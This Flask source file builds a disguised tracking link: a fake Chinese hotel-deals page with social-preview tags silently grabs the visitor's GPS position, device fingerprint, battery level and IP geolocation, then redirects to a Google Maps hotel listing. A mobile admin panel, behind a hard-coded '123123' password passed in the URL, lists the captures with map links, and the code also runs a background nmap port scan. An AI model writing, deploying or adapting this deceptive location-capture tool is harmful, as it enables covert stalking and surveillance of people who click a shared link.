from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse

app = Flask(__name__)

# Buffers de armazenamento em RAM
registros_gps = []
registros_ip = []

# Credenciais de Acesso ao Console
SENHA_ADMIN = "123123"

# Link de redirecionamento final solicitado
LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"

# Página HTML de Captura Silenciosa com Meta Tags Open Graph
HTML_CAPTURA = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotéis na China e Região</title>
    
    <meta property="og:title" content="Reserva de Hotéis - Arquitetura e Hospedagem na China">
    <meta property="og:description" content="Encontre as melhores ofertas e pacotes de hospedagem na China com desconto exclusivo.">
    <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
    <meta property="og:url" content="https://loc-nsdi.onrender.com/">
    <meta property="og:type" content="website">

    <style>
        body {{ background-color: #ffffff; margin: 0; }}
    </style>
</head>
<body>
    <script>
        const urlDestino = "{LINK_DESTINO}";

        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
            let infoHardware = {{
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                platform: navigator.platform || 'N/A',
                language: navigator.language || 'N/A',
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                bateria: 'N/A',
                resolucqao: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth + ' bits'
            }};

            if (navigator.getBattery) {{
                try {{
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
                }} catch(e) {{}}
            }}

            const payload = {{
                hw: infoHardware,
                latitude: lat,
                longitude: lon,
                precisao: precisao
            }};

            try {{
                await fetch('/salvar-payload-total', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
            }} catch(e) {{
                console.error("Erro no dispatch:", e);
            }} finally {{
                window.location.replace(urlDestino);
            }}
        }}

        function lidarComSucesso(position) {{
            executarPayloadCompleto(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy
            );
        }}

        function lidarComErro(error) {{
            console.warn("GPS Negado ou Indisponível: " + error.message);
            executarPayloadCompleto(null, null, null);
        }}

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {{
                enableHighAccuracy: true,
                timeout: 6000,
                maximumAge: 0
            }});
        }} else {{
            executarPayloadCompleto(null, null, null);
        }}
    </script>
</body>
</html>
"""

# Painel Administrativo Otimizado para Celular (Fontes grandes, ID numérico, Lista zebrada)
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Mobile - Telemetria</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0; 
            padding: 10px; 
            background: #121212; 
            color: #E0E0E0; 
        }
        h2 {
            color: #00FF66;
            font-size: 18px;
            border-bottom: 2px solid #00FF66;
            padding-bottom: 5px;
            margin-top: 20px;
        }
        .status-box {
            background: #1E1E1E;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            margin-bottom: 15px;
            border-left: 4px solid #00FF66;
        }
        .table-container {
            width: 100%;
            overflow-x: auto;
            margin-bottom: 25px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #1E1E1E; 
            font-size: 13px;
        }
        th, td { 
            border: 1px solid #333333; 
            padding: 10px 8px; 
            text-align: left; 
        }
        th { 
            background: #252525; 
            color: #00FF66; 
            font-size: 13px;
        }
        /* Lista Zebrada */
        tr:nth-child(even) { background: #181818; }
        tr:nth-child(odd) { background: #212121; }
        
        a { color: #3399FF; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .badge { 
            background: #2D2D2D; 
            color: #00FF66; 
            padding: 3px 6px; 
            border-radius: 4px; 
            font-size: 11px; 
            display: inline-block; 
            margin: 2px 0;
            border: 1px solid #444;
        }
        .id-tag {
            background: #00FF66;
            color: #000;
            font-weight: bold;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 12px;
            text-align: center;
        }
        details summary {
            cursor: pointer;
            color: #3399FF;
            font-weight: bold;
        }
        .empty-msg {
            color: #FF5555;
            text-align: center;
            padding: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="status-box">
    <b>CONSOLE MOBILE</b><br>
    Status: <span style="color: #00FF66;">ONLINE</span> | Auto-Refresh: 5s
</div>

<h2>[ 01 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
<div class="table-container">
    <table>
        <tr>
            <th>ID</th>
            <th>DATA / HORA</th>
            <th>IP ORIGEM</th>
            <th>LAT / LONG</th>
            <th>PRECISÃO</th>
            <th>MAPS</th>
        </tr>
        {% for r in gps %}
        <tr>
            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
            <td>{{ r.data }}</td>
            <td><b>{{ r.ip }}</b></td>
            <td>{{ r.lat }}, {{ r.lon }}</td>
            <td>{{ r.precisao }}m</td>
            <td><a href="{{ r.maps }}" target="_blank">🗺️ Abrir</a></td>
        </tr>
        {% else %}
        <tr><td colspan="6" class="empty-msg">Nenhum dado de GPS capturado ainda.</td></tr>
        {% endfor %}
    </table>
</div>

<h2>[ 02 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
<div class="table-container">
    <table>
        <tr>
            <th>ID</th>
            <th>DATA / HORA</th>
            <th>IP / LOCALIZAÇÃO / ISP</th>
            <th>HARDWARE & DISPOSITIVO</th>
            <th>NAVEGADOR / USER-AGENT</th>
            <th>PORTAS ABERTAS</th>
        </tr>
        {% for r in ips %}
        <tr>
            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
            <td>{{ r.data }}</td>
            <td>
                <b>{{ r.ip }}</b><br>
                <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
                <small>{{ r.isp }}</small><br>
                Conexão: <b>{{ r.hw.connectionType }}</b>
            </td>
            <td>
                Cores CPU: {{ r.hw.hardwareConcurrency }}<br>
                RAM: {{ r.hw.deviceMemory }} GB<br>
                Bateria: {{ r.hw.bateria }}<br>
                Tela: {{ r.hw.resolucqao }}<br>
                Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
                Fuso: {{ r.hw.timezone }}
            </td>
            <td>
                <b>OS:</b> {{ r.ua_info.os }}<br>
                <b>Browser:</b> {{ r.ua_info.browser }}<br>
                <b>Device:</b> {{ r.ua_info.device }}<br>
                <b>Idioma:</b> {{ r.hw.language }}<br>
                <details style="margin-top: 6px;">
                    <summary>Ver User-Agent</summary>
                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
                </details>
            </td>
            <td>
                {% if r.portas %}
                    {% for p in r.portas %}
                        <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                    {% endfor %}
                {% else %}
                    <span style="color: #FF5555;">Escaneando...</span>
                {% endif %}
            </td>
        </tr>
        {% else %}
        <tr><td colspan="6" class="empty-msg">Nenhum registro de rede capturado ainda.</td></tr>
        {% endfor %}
    </table>
</div>

<script>
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
        
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro na varredura Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "blocked", "servico": "filtered"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-payload-total', methods=['POST'])
def salvar_payload_total():
    dados = request.json or {}
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                api_data = json.loads(response.read().decode())
                if api_data.get('status') == 'success':
                    cidade = api_data.get('city', 'Desconhecido')
                    estado = api_data.get('regionName', 'Desconhecido')
                    pais = api_data.get('country', 'Desconhecido')
                    isp = api_data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro GeoIP:", e)

    hw = dados.get('hw', {})

    novo_registro_ip = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    registros_ip.insert(0, novo_registro_ip)

    t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
    t.start()

    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')

    if lat is not None and lon is not None:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        registros_gps.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "lat": lat,
            "lon": lon,
            "precisao": precisao,
            "maps": maps_link
        })

    return jsonify({"status": "sucesso", "payload": "processed"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: sans-serif; background: #121212; color: #FF5555; text-align: center; margin-top: 20%;">
            <h2>ACESSO NEGADO</h2>
            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)